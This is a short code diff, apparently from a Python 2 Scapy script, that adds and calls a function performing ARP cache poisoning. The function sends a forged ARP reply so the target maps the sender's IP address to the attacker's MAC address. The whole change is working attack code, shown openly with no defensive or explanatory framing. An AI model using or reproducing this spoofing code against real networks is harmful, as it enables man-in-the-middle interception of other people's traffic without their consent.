@@ -59,6 +59,14 @@ def get_remote_mac_address(my_ip, sender_ip):
 	return result[0][ARP][0][1].hwsrc
 
 
+# real ARP cache posoning
+def arp_cache_poisoning(my_mac, sender_ip, sender_mac, target_ip, target_mac):
+	packet = send( Ether(dst=target_mac, src=my_mac)/ARP(op=ARP_REPLY,  psrc=sender_ip, pdst=target_ip))
+	print packet
+
+
+
+
 # function to check user name
 def isRoot():
 	username = getpass.getuser()
@@ -159,5 +167,5 @@ if __name__ == "__main__":
 	print "#" * 10 + "#" * len(" get mac address of SENDER ")
 
 
-
+	arp_cache_poisoning(my_mac_address, sender_ip, sender_mac, target_ip, target_mac)
 
